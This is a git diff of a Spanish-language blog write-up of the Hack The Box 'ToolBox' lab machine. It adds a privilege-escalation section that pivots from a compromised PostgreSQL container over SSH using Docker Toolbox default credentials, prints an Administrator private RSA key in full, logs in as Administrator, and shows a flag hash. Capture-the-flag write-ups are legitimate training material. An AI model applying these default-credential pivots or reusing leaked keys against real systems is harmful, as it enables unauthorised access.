@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Hack The Box - ToolBox 
-excerpt: "Rabbit Store es una máquina media de Try Hack Me donde se explota una api para obtener acceso privilegiado a un sistema donde pueden cargarse archivos, apartir de aqui se explota un SSRF para obtener un endpoint de la api en especifico, posteriormente se explota un SSTI que permite la ejecución remota de comandos, para la escalación de privilegios se comunica con rabbitqm para obtener la ocntraseña del root"
+excerpt: "`ToolBox` es una máquina _Easy_ de Hack The Box. Se explota una inyección SQL contra PostgreSQL para obtener una shell. Aunque la máquina parece Windows, ejecuta contenedores Linux, por lo que la explotación desde la inyección requiere payloads de Linux. Para escalar privilegios se abusa de Boot2Docker (Docker Toolbox) para pivotar a otro contenedor del mismo segmento; desde allí hay un montaje con estructura Windows que contiene una clave SSH que permite conectarse como **Administrador**."
 date: 2025-10-09
 classes: wide
 header:
@@ -17,7 +17,6 @@ tags:
   - sqlmap
   - docker pivoting 
   - boot2docker (Docker ToolBox)
-  
 
 ---
 <style>
@@ -44,106 +43,108 @@ tags:
     width: 90%;
     max-width: 400px;
     height: 300px;
-        background-image: url("/assets/images/htb-writeup-ToolBox/toolbox.png");
-        background-size: cover;
-        background-position: center;
-        margin: 2rem auto 1rem auto;
-        overflow: hidden;
-      }
+    background-image: url("/assets/images/htb-writeup-ToolBox/toolbox.png")
+);
+    background-size: cover;
+    background-position: center;
+    margin: 2rem auto 1rem auto;
+    overflow: hidden;
+  }
 
-      .glitch:before {
-        content: '';
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background-image: url("/assets/images/htb-writeup-ToolBox/toolbox.png");
-        background-size: cover;
-        background-position: center;
-        opacity: 0.5;
-        mix-blend-mode: hard-light;
-        animation: glitch2 10s linear infinite;
-      }
+  .glitch:before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-image: url("/assets/images/htb-writeup-ToolBox/toolbox.png")
+;
+    background-size: cover;
+    background-position: center;
+    opacity: 0.5;
+    mix-blend-mode: hard-light;
+    animation: glitch2 10s linear infinite;
+  }
 
-      .glitch:hover:before {
-        animation: glitch1 1s linear infinite;
-      }
+  .glitch:hover:before {
+    animation: glitch1 1s linear infinite;
+  }
 
-      @keyframes glitch1 {
-        0% { background-position: 0 0; filter: hue-rotate(0deg); }
-        10% { background-position: 5px 0; }
-        20% { background-position: -5px 0; }
-        30% { background-position: 15px 0; }
-        40% { background-position: -5px 0; }
-        50% { background-position: -25px 0; }
-        60% { background-position: -50px 0; }
-        70% { background-position: 0 -20px; }
-        80% { background-position: -60px -20px; }
-        81% { background-position: 0 0; }
-        100% { background-position: 0 0; filter: hue-rotate(360deg); }
-      }
+  @keyframes glitch1 {
+    0% { background-position: 0 0; filter: hue-rotate(0deg); }
+    10% { background-position: 5px 0; }
+    20% { background-position: -5px 0; }
+    30% { background-position: 15px 0; }
+    40% { background-position: -5px 0; }
+    50% { background-position: -25px 0; }
+    60% { background-position: -50px 0; }
+    70% { background-position: 0 -20px; }
+    80% { background-position: -60px -20px; }
+    81% { background-position: 0 0; }
+    100% { background-position: 0 0; filter: hue-rotate(360deg); }
+  }
 
-      @keyframes glitch2 {
-        0% { background-position: 0 0; filter: hue-rotate(0deg); }
-        10% { background-position: 15px 0; }
-        15% { background-position: -15px 0; }
-        20% { filter: hue-rotate(360deg); }
-        25% { background-position: 0 0; filter: hue-rotate(0deg); }
-        100% { background-position: 0 0; filter: hue-rotate(0deg); }
-      }
+  @keyframes glitch2 {
+    0% { background-position: 0 0; filter: hue-rotate(0deg); }
+    10% { background-position: 15px 0; }
+    15% { background-position: -15px 0; }
+    20% { filter: hue-rotate(360deg); }
+    25% { background-position: 0 0; filter: hue-rotate(0deg); }
+    100% { background-position: 0 0; filter: hue-rotate(0deg); }
+  }
 
-      .title {
-        font-size: 1.5rem;
-        font-weight: bold;
-        margin-bottom: 0.5rem;
-      }
+  .title {
+    font-size: 1.5rem;
+    font-weight: bold;
+    margin-bottom: 0.5rem;
+  }
 
-      .date {
-        font-size: 1rem;
-        color: #ccc;
-        margin-bottom: 1rem;
-      }
+  .date {
+    font-size: 1rem;
+    color: #ccc;
+    margin-bottom: 1rem;
+  }
 
-      .info {
-        display: flex;
-        justify-content: center;
-        gap: 2rem;
-        flex-wrap: wrap;
-        margin-top: 1rem;
-        font-size: 0.9rem;
-      }
+  .info {
+    display: flex;
+    justify-content: center;
+    gap: 2rem;
+    flex-wrap: wrap;
+    margin-top: 1rem;
+    font-size: 0.9rem;
+  }
 
-      .info div {
-        text-align: center;
-      }
+  .info div {
+    text-align: center;
+  }
 
-      .info .label {
-        color: #999;
-        font-size: 0.8rem;
-      }
+  .info .label {
+    color: #999;
+    font-size: 0.8rem;
+  }
 
-      .icon {
-        font-size: 2rem;
-        color: #0f0;
-        margin: 0.5rem 0;
-      }
+  .icon {
+    font-size: 2rem;
+    color: #0f0;
+    margin: 0.5rem 0;
+  }
 
-      /* Responsive */
-      @media (max-width: 575.5px) {
-        .glitch {
-          height: 200px;
-        }
-        .title {
-          font-size: 1.3rem;
-        }
-      }
-    </style>
+  /* Responsive */
+  @media (max-width: 575.5px) {
+    .glitch {
+      height: 200px;
+    }
+    .title {
+      font-size: 1.3rem;
+    }
+  }
+</style>
 
-    <body>
-        <div class="glitch">  
-        </div>
-    </body>
+<body>
+    <div class="glitch">  
+    </div>
+</body>
 
     <br>
 
@@ -458,6 +459,156 @@ do you want to retrieve the command standard output? [Y/n/a] Y
 [15:39:16] [INFO] retrieved: 'postgres'
 command standard output: 'postgres'
 os-shell> 
+```
+## Escalada de privilegios
+
+Tras revisar la IP de la máquina, confirmé que estoy dentro de un contenedor
+
+```bash
+postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ hostname -I
+172.17.0.2
+```
+después de revisar la tabla de enrutamiento de la máquina con `route -n`, observé que hay otra IP dentro de ese segmento
+
+```bash
+postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ route -n
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+0.0.0.0         172.17.0.1      0.0.0.0         UG    0      0        0 eth0
+172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth0
+```
+seguramente la otra dirección IP `172.17.0.1` corresponde a la máquina real. Al inspeccionar el software _docker-toolbox_, encontré que existen credenciales por defecto para conectarse vía SSH
+
+- docker
+- tcuser
+
+probé estas credenciales en la otra IP `172.17.0.1` y funcionaron
+
+```bash
+postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ssh docker@172.17.0.1
+docker@172.17.0.1's password: 
+   ( '>')
+  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
+ (/-_--_-\)           www.tinycorelinux.net
+
+docker@box:~$ whoami
+docker
+```
+al enumerar la máquina, en la raíz se encontró un directorio extraño llamado `C`; al revisarlo, se observó una estructura similar a la de Windows
+
+```bash
+docker@box:/$ ls -la                                                           
+total 244
+drwxr-xr-x   17 root     root           440 Oct  8 22:58 .
+drwxr-xr-x   17 root     root           440 Oct  8 22:58 ..
+drwxr-xr-x    2 root     root          1420 Oct  8 22:56 bin
+drwxr-xr-x    3 root     root            60 Oct  8 22:58 c
+drwxrwxr-x   14 root     staff         4340 Oct  8 22:56 dev
+drwxr-xr-x    9 root     root          1000 Oct  8 22:58 etc
+drwxrwxr-x    4 root     staff           80 Oct  8 22:56 home
+-rwxr-xr-x    1 root     root           496 Oct 19  2019 init
+drwxr-xr-x    4 root     root           800 Oct  8 22:56 lib
+lrwxrwxrwx    1 root     root             3 Oct  8 22:56 lib64 -> lib
+lrwxrwxrwx    1 root     root            11 Oct  8 22:56 linuxrc -> bin/busybox
+drwxr-xr-x    4 root     root            80 Oct  8 22:56 mnt
+drwxrwsr-x    3 root     staff          180 Oct  8 22:58 opt
+dr-xr-xr-x  161 root     root             0 Oct  8 22:55 proc
+drwxrwxr-x    2 root     staff           80 Oct  8 22:56 root
+drwxrwxr-x    6 root     staff          140 Oct  8 22:58 run
+drwxr-xr-x    2 root     root          1300 Oct  8 22:56 sbin
+-rw-r--r--    1 root     root        241842 Oct 19  2019 squashfs.tgz
+dr-xr-xr-x   13 root     root             0 Oct  8 22:56 sys
+lrwxrwxrwx    1 root     root            13 Oct  8 22:56 tmp -> /mnt/sda1/tmp
+drwxr-xr-x    7 root     root           140 Oct  8 22:56 usr
+drwxrwxr-x    8 root     staff          180 Oct  8 22:56 var
+```
+```bash
+docker@box:/c/Users$ ls -la                                                    
+total 33
+dr-xr-xr-x    1 docker   staff         4096 Feb 19  2020 .
+drwxr-xr-x    3 root     root            60 Oct  8 22:58 ..
+drwxrwxrwx    1 docker   staff         8192 Feb  8  2021 Administrator
+ls: ./All Users: cannot read link: Protocol error
+lrwxrwxrwx    1 docker   staff            0 Sep 15  2018 All Users
+dr-xr-xr-x    1 docker   staff            0 Feb 18  2020 Default
+dr-xr-xr-x    1 docker   staff         8192 Feb 18  2020 Default User
+dr-xr-xr-x    1 docker   staff         4096 Feb 18  2020 Public
+drwxrwxrwx    1 docker   staff         8192 Feb 18  2020 Tony
+-rwxrwxrwx    1 docker   staff          174 Sep 15  2018 desktop.ini
+```
+dentro de la carpeta del administrador se encontró un directorio `.ssh` que contiene una llave privada `id_rsa`
+
+```bash
+docker@box:/c/Users/Administrator/.ssh$ ls -la                                 
+total 18
+drwxrwxrwx    1 docker   staff         4096 Feb 19  2020 .
+drwxrwxrwx    1 docker   staff         8192 Feb  8  2021 ..
+-rwxrwxrwx    1 docker   staff          404 Feb 19  2020 authorized_keys
+-rwxrwxrwx    1 docker   staff         1675 Feb 19  2020 id_rsa
+-rwxrwxrwx    1 docker   staff          404 Feb 19  2020 id_rsa.pub
+-rwxrwxrwx    1 docker   staff          348 Feb 19  2020 known_hosts
+docker@box:/c/Users/Administrator/.ssh$ cat id_rsa                             
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAvo4SLlg/dkStA4jDUNxgF8kbNAF+6IYLNOOCeppfjz6RSOQv
+Md08abGynhKMzsiiVCeJoj9L8GfSXGZIfsAIWXn9nyNaDdApoF7Mfm1KItgO+W9m
+M7lArs4zgBzMGQleIskQvWTcKrQNdCDj9JxNIbhYLhJXgro+u5dW6EcYzq2MSORm
+7A+eXfmPvdr4hE0wNUIwx2oOPr2duBfmxuhL8mZQWu5U1+Ipe2Nv4fAUYhKGTWHj
+4ocjUwG9XcU0iI4pcHT3nXPKmGjoPyiPzpa5WdiJ8QpME398Nne4mnxOboWTp3jG
+aJ1GunZCyic0iSwemcBJiNyfZChTipWmBMK88wIDAQABAoIBAH7PEuBOj+UHrM+G
+Stxb24LYrUa9nBPnaDvJD4LBishLzelhGNspLFP2EjTJiXTu5b/1E82qK8IPhVlC
+JApdhvDsktA9eWdp2NnFXHbiCg0IFWb/MFdJd/ccd/9Qqq4aos+pWH+BSFcOvUlD
+vg+BmH7RK7V1NVFk2eyCuS4YajTW+VEwD3uBAl5ErXuKa2VP6HMKPDLPvOGgBf9c
+l0l2v75cGjiK02xVu3aFyKf3d7t/GJBgu4zekPKVsiuSA+22ZVcTi653Tum1WUqG
+MjuYDIaKmIt9QTn81H5jAQG6CMLlB1LZGoOJuuLhtZ4qW9fU36HpuAzUbG0E/Fq9
+jLgX0aECgYEA4if4borc0Y6xFJxuPbwGZeovUExwYzlDvNDF4/Vbqnb/Zm7rTW/m
+YPYgEx/p15rBh0pmxkUUybyVjkqHQFKRgu5FSb9IVGKtzNCtfyxDgsOm8DBUvFvo
+qgieIC1S7sj78CYw1stPNWS9lclTbbMyqQVjLUvOAULm03ew3KtkURECgYEA17Nr
+Ejcb6JWBnoGyL/yEG44h3fHAUOHpVjEeNkXiBIdQEKcroW9WZY9YlKVU/pIPhJ+S
+7s++kIu014H+E2SV3qgHknqwNIzTWXbmqnclI/DSqWs19BJlD0/YUcFnpkFG08Xu
+iWNSUKGb0R7zhUTZ136+Pn9TEGUXQMmBCEOJLcMCgYBj9bTJ71iwyzgb2xSi9sOB
+MmRdQpv+T2ZQQ5rkKiOtEdHLTcV1Qbt7Ke59ZYKvSHi3urv4cLpCfLdB4FEtrhEg
+5P39Ha3zlnYpbCbzafYhCydzTHl3k8wfs5VotX/NiUpKGCdIGS7Wc8OUPBtDBoyi
+xn3SnIneZtqtp16l+p9pcQKBgAg1Xbe9vSQmvF4J1XwaAfUCfatyjb0GO9j52Yp7
+MlS1yYg4tGJaWFFZGSfe+tMNP+XuJKtN4JSjnGgvHDoks8dbYZ5jaN03Frvq2HBY
+RGOPwJSN7emx4YKpqTPDRmx/Q3C/sYos628CF2nn4aCKtDeNLTQ3qDORhUcD5BMq
+bsf9AoGBAIWYKT0wMlOWForD39SEN3hqP3hkGeAmbIdZXFnUzRioKb4KZ42sVy5B
+q3CKhoCDk8N+97jYJhPXdIWqtJPoOfPj6BtjxQEBoacW923tOblPeYkI9biVUyIp
+BYxKDs3rNUsW1UUHAvBh0OYs+v/X+Z/2KVLLeClznDJWh/PNqF5I
+-----END RSA PRIVATE KEY-----
+```
+con esta llave pude iniciar sesión en la máquina como el usuario `Administrador`
+
+```bash
+┌──(root㉿kali)-[/home/kali]
+└─# ssh Administrator@10.10.10.236 -i id_rsa 
+The authenticity of host '10.10.10.236 (10.10.10.236)' can't be established.
+ED25519 key fingerprint is SHA256:KJAib23keV2B8xvFaxg7e79uztryW+LYX+Wb2qA9u4k.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.236' (ED25519) to the list of known hosts.
+Microsoft Windows [Version 10.0.17763.1039]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+administrator@TOOLBOX C:\Users\Administrator>whoami
+toolbox\administrator
+
+administrator@TOOLBOX C:\Users\Administrator>
+```
+con esto pude ver la bandera `root`, pero no encontré la bandera `user.txt`; la busqué con `dir` y no obtuve ningún resultado
+
+```bash
+administrator@TOOLBOX C:\>dir /s /r user.txt 
+ Volume in drive C has no label. 
+ Volume Serial Number is 64F8-B588
+File Not Found 
+```
+Esto puede indicar que la bandera se encuentra dentro del contenedor, por lo que volví a ingresar y la busqué con `find`
+
+```bash
+nullgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ find / -name user.txt 2>/dev/ 
+/var/lib/postgresql/user.txt
+postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ cat /var/lib/postgresql/user.txt
+f0183e44378ea9774433e2ca6ac78c6a  flag.txt
 ```
 
 
